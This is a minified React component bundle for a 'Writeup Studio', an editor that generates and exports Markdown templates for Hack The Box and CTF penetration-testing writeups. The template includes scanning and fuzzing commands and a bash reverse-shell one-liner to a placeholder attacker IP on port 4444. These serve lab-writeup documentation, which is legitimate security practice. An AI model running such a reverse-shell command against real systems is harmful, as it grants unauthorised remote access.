import{a as p,j as e,z as T,h as B,C as W,c as L,as as A,S as M,D as U,aA as k,aj as V,ar as G,aB as z}from"./vendor-ui-DEQdev4l.js";import{a as H,u as K,p as f,P as Y}from"./index-DvJxy4Y7.js";import"./vendor-react-CJuRcchx.js";import"./vendor-utils-BTDfHNxJ.js";const X=()=>{const{id:x}=H(),{machines:i,writeupMachineId:E,setWriteupMachineId:u,updateMachine:b,soundEnabled:m}=K();p.useEffect(()=>{x&&i.some(t=>t.id===x)&&u(x)},[x,i,u]);const r=i.find(t=>t.id===E)||i[0],[S,w]=p.useState(!1),[C,j]=p.useState(!1),[l,d]=p.useState(""),v=t=>{const a=new Date().toISOString().slice(0,10),o=t.tags.length>0?t.tags.join(", "):"ctf, pentest, writeup";return`---
title: "HTB / CTF Writeup - ${t.name}"
target_ip: "${t.ip}"
platform: "${t.platform}"
os: "${t.os}"
difficulty: "${t.difficulty}"
status: "${t.status}"
user_flag: "${t.userFlag||"FLAG{...}"}"
root_flag: "${t.rootFlag||"FLAG{...}"}"
time_spent: "${Math.round(t.timeSpentSeconds/60)} minutes"
tags: [${o}]
date: "${a}"
author: "ZeroBox Operator"
---

# ${t.name} — Writeup & Penetration Testing Report
**Target IP:** \`${t.ip}\` | **OS:** ${t.os} | **Platform:** ${t.platform} | **Difficulty:** ${t.difficulty}

---

## 1. Executive Summary & Difficulty Breakdown
- **Initial Foothold Vector:** [Brief summary of initial vulnerability, e.g. SQL Injection / LFI / Deserialization]
- **Privilege Escalation Vector:** [Brief summary of root escalation, e.g. SUID binary / Sudo misconfiguration / ADCS]
- **Perceived Rating:** ${t.difficulty} (Official) vs ${t.perceivedDifficulty||t.difficulty} (Perceived)

---

## 2. Reconnaissance & Nmap Scan Results
### TCP All-Ports Scan
\`\`\`bash
# Fast SYN and Service Version Detection
nmap -sC -sV -Pn --min-rate 2000 -oN nmap_quick.txt ${t.ip}
\`\`\`

### Discovered Services:
- **Port 22/tcp:** Open (OpenSSH 8.4p1)
- **Port 80/tcp:** Open (Apache httpd 2.4.41)
- **Port 445/tcp:** Filtered (SMB)

### Web Directory & Endpoint Fuzzing
\`\`\`bash
ffuf -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -u http://${t.ip}/FUZZ -ac
\`\`\`

---

## 3. Vulnerability Analysis & Foothold Exploitation
### Discovery:
[Detail the attack vector found during enumeration]

### Exploitation Proof-of-Concept:
\`\`\`bash
# Reverse Shell or Exploit Execution
bash -i >& /dev/tcp/10.10.14.X/4444 0>&1
\`\`\`

### User Flag Loot:
\`\`\`bash
cat /home/*/user.txt
# Flag: ${t.userFlag||"FLAG{...}"}
\`\`\`

---

## 4. Privilege Escalation & Proof of Concept
### Internal Enumeration:
- Ran LinPEAS / WinPEAS automated audit.
- Identified misconfigured SUID / Sudo permissions:
\`\`\`bash
sudo -l
\`\`\`

### Root Escalation:
[Explain escalation path step by step]

### Root / System Flag:
\`\`\`bash
cat /root/root.txt
# Flag: ${t.rootFlag||"FLAG{...}"}
\`\`\`

---

## 5. Post-Exploitation Loot & Lessons Learned
- **Key Takeaway 1:** Always inspect source comments for credential leaks.
- **Key Takeaway 2:** Validate wildcard expansions in scheduled crontabs.
- **Mitigation:** Patch vulnerable services, restrict sudoers configuration, and apply least privilege principles.
`};p.useEffect(()=>{if(r)if(r.writeupMarkdown)d(r.writeupMarkdown);else{const t=v(r);d(t),b(r.id,{writeupMarkdown:t})}},[r==null?void 0:r.id]);const R=t=>{const a=t.target.value;d(a),r&&b(r.id,{writeupMarkdown:a})},D=()=>{if(r&&confirm(`Reset writeup for ${r.name} to standard template?`)){const t=v(r);d(t),b(r.id,{writeupMarkdown:t}),m&&f("root")}},P=()=>{navigator.clipboard.writeText(l),w(!0),m&&f("copy"),setTimeout(()=>w(!1),2e3)},I=()=>{if(!r)return;const t=new Blob([l],{type:"text/markdown;charset=utf-8"}),a=URL.createObjectURL(t),o=document.createElement("a");o.href=a,o.download=`${r.name.toLowerCase().replace(/[^a-z0-9]/g,"-")}-writeup.md`,document.body.appendChild(o),o.click(),document.body.removeChild(o),URL.revokeObjectURL(a),m&&f("root")},$=t=>{const a=t.split(`
`);let o=!1,N=[],h=!1,y="",g=[];const n=[];return a.forEach((s,c)=>{if(c===0&&s.trim()==="---"){o=!0;return}if(o){if(s.trim()==="---"){o=!1,n.push(e.jsxs("div",{className:"mb-4 p-3 rounded-lg bg-cyber-bg border border-cyber-cyan/30 text-[11px] font-mono text-cyber-cyan/90 space-y-0.5",children:[e.jsxs("div",{className:"text-[10px] uppercase font-bold text-cyber-muted mb-1 flex items-center gap-1",children:[e.jsx(z,{className:"w-3 h-3 text-cyber-cyan"})," OBSIDIAN / GITBOOK YAML FRONTMATTER"]}),N.map((F,O)=>e.jsx("div",{children:F},O))]},`fm-${c}`));return}N.push(s);return}if(s.startsWith("```")){h?(h=!1,n.push(e.jsxs("div",{className:"my-3 rounded-lg overflow-hidden border border-cyber-border bg-cyber-code",children:[y&&e.jsxs("div",{className:"bg-cyber-bg/80 px-3 py-1 text-[10px] text-cyber-muted font-mono uppercase border-b border-cyber-border flex items-center justify-between",children:[e.jsx("span",{children:y}),e.jsx(k,{className:"w-3 h-3"})]}),e.jsx("pre",{className:"p-3 text-xs text-cyber-emerald font-mono overflow-x-auto whitespace-pre-wrap",children:g.join(`
`)})]},`cb-${c}`))):(h=!0,y=s.replace("```","").trim(),g=[]);return}if(h){g.push(s);return}s.startsWith("# ")?n.push(e.jsx("h1",{className:"text-xl font-bold text-white mt-4 mb-2 pb-1 border-b border-cyber-border",children:s.replace("# ","")},c)):s.startsWith("## ")?n.push(e.jsx("h2",{className:"text-base font-bold text-cyber-cyan mt-4 mb-1.5 flex items-center gap-2",children:s.replace("## ","")},c)):s.startsWith("### ")?n.push(e.jsx("h3",{className:"text-sm font-semibold text-cyber-text mt-3 mb-1",children:s.replace("### ","")},c)):s.startsWith("---")?n.push(e.jsx("hr",{className:"my-3 border-cyber-border"},c)):s.startsWith("- ")?n.push(e.jsx("li",{className:"ml-4 text-xs text-cyber-text list-disc my-0.5",children:s.replace("- ","")},c)):s.trim()===""?n.push(e.jsx("div",{className:"h-2"},c)):n.push(e.jsx("p",{className:"text-xs text-cyber-text leading-relaxed font-sans",children:s},c))}),n};return e.jsxs("div",{className:"space-y-4 w-full font-mono",children:[e.jsxs("div",{className:"p-4 rounded-xl border border-cyber-border bg-cyber-card/90 shadow-md flex flex-wrap items-center justify-between gap-4",children:[e.jsxs("div",{className:"flex items-center gap-3",children:[e.jsx("div",{className:"w-10 h-10 rounded-lg bg-cyber-bg border border-cyber-cyan/40 flex items-center justify-center",children:e.jsx(T,{className:"w-5 h-5 text-cyber-cyan"})}),e.jsxs("div",{children:[e.jsxs("h1",{className:"text-base font-bold text-white flex items-center gap-2",children:["EMBEDDED WRITEUP STUDIO",e.jsx("span",{className:"text-[10px] font-semibold px-2 py-0.5 rounded bg-cyber-cyan/10 text-cyber-cyan border border-cyber-cyan/30",children:"OBSIDIAN & GITBOOK READY"})]}),e.jsx("p",{className:"text-xs text-cyber-muted mt-0.5",children:"Dual-pane live editor with automated pentest template generation, frontmatter, and single-click .md export."})]})]}),e.jsxs("div",{className:"flex flex-wrap items-center gap-2.5",children:[e.jsxs("div",{className:"flex items-center gap-1.5 bg-cyber-bg px-2.5 py-1 rounded-lg border border-cyber-border",children:[e.jsx("span",{className:"text-[10px] uppercase font-bold text-cyber-muted",children:"Target Box:"}),e.jsx("select",{value:(r==null?void 0:r.id)||"",onChange:t=>u(t.target.value),className:"bg-transparent text-xs text-white font-bold focus:outline-none max-w-[180px] truncate",children:i.map(t=>e.jsxs("option",{value:t.id,className:"bg-cyber-card text-white",children:[t.name," (",t.platform,")"]},t.id))})]}),e.jsxs("button",{onClick:D,className:"flex items-center gap-1 px-2.5 py-1.5 rounded-lg bg-cyber-bg border border-cyber-border text-cyber-muted hover:text-white text-xs transition-colors",title:"Reset to fresh pentest template",children:[e.jsx(B,{className:"w-3.5 h-3.5"}),e.jsx("span",{className:"hidden sm:inline",children:"Reset Template"})]}),e.jsx("button",{onClick:P,className:"flex items-center gap-1 px-3 py-1.5 rounded-lg bg-cyber-card border border-cyber-border hover:border-cyber-cyan text-white text-xs font-semibold transition-all",children:S?e.jsxs(e.Fragment,{children:[e.jsx(W,{className:"w-3.5 h-3.5 text-cyber-emerald"}),e.jsx("span",{className:"text-cyber-emerald",children:"Copied!"})]}):e.jsxs(e.Fragment,{children:[e.jsx(L,{className:"w-3.5 h-3.5"}),e.jsx("span",{children:"Copy Raw"})]})}),e.jsxs("button",{onClick:()=>j(!0),className:"flex items-center gap-1.5 px-3 py-1.5 rounded-lg bg-cyber-card border border-cyber-cyan/40 hover:border-cyber-cyan text-cyber-cyan hover:bg-cyber-cyan/10 text-xs font-bold transition-all shadow-glow-cyan/20",title:"Generate print-ready Executive Penetration Testing Report",children:[e.jsx(A,{className:"w-3.5 h-3.5"}),e.jsx("span",{children:"Executive Report"})]}),!!(r!=null&&r.officialWalkthrough)&&e.jsxs("button",{onClick:()=>{if(!r.officialWalkthrough)return;const t=`

---

## 🛡️ Official Hack The Box Walkthrough & Intelligence
${r.officialWalkthrough}
`,a=l+t;d(a),b(r.id,{writeupMarkdown:a}),m&&f("engage")},className:"flex items-center gap-1.5 px-3 py-1.5 rounded-lg bg-cyber-emerald/15 border border-cyber-emerald/40 hover:border-cyber-emerald text-cyber-emerald hover:bg-cyber-emerald hover:text-black text-xs font-bold transition-all shadow-sm",title:"Append official Hack The Box Walkthrough & Intelligence to this writeup",children:[e.jsx(M,{className:"w-3.5 h-3.5"}),e.jsx("span",{children:"+ Official HTB Intel"})]}),e.jsxs("button",{onClick:I,className:"flex items-center gap-1.5 px-3 py-1.5 rounded-lg bg-cyber-emerald text-black font-bold text-xs hover:bg-cyber-emerald/90 transition-all shadow-glow-emerald",children:[e.jsx(U,{className:"w-3.5 h-3.5"}),e.jsx("span",{children:"Export .md"})]})]})]}),e.jsxs("div",{className:"grid grid-cols-1 lg:grid-cols-2 gap-4 items-stretch min-h-[calc(100vh-250px)]",children:[e.jsxs("div",{className:"flex flex-col rounded-xl border border-cyber-border bg-cyber-card overflow-hidden shadow-lg",children:[e.jsxs("div",{className:"flex items-center justify-between border-b border-cyber-border px-4 py-2.5 bg-cyber-bg/70 text-xs",children:[e.jsxs("span",{className:"font-bold text-white flex items-center gap-2",children:[e.jsx(k,{className:"w-4 h-4 text-cyber-cyan"})," RAW MARKDOWN (YAML & BODY)"]}),e.jsxs("span",{className:"text-[10px] text-cyber-muted",children:[l.length," chars · ",l.split(`
`).length," lines"]})]}),e.jsx("textarea",{value:l,onChange:R,placeholder:"Write your penetration testing report or paste notes here...",className:"flex-1 w-full p-4 bg-cyber-bg text-cyber-text font-mono text-xs focus:outline-none resize-none leading-relaxed overflow-y-auto",spellCheck:!1})]}),e.jsxs("div",{className:"flex flex-col rounded-xl border border-cyber-border bg-cyber-card overflow-hidden shadow-lg",children:[e.jsxs("div",{className:"flex items-center justify-between border-b border-cyber-border px-4 py-2.5 bg-cyber-bg/70 text-xs",children:[e.jsxs("span",{className:"font-bold text-white flex items-center gap-2",children:[e.jsx(V,{className:"w-4 h-4 text-cyber-emerald"})," LIVE RENDERED PREVIEW"]}),e.jsxs("span",{className:"text-[10px] text-cyber-emerald font-semibold flex items-center gap-1",children:[e.jsx(G,{className:"w-3 h-3"})," OBSIDIAN PREVIEW"]})]}),e.jsx("div",{className:"flex-1 p-5 overflow-y-auto max-h-[calc(100vh-280px)] bg-cyber-card/40",children:$(l)})]})]}),e.jsx(Y,{machine:r||i[0]||null,isOpen:C,onClose:()=>j(!1)})]})};export{X as WriteupStudio};
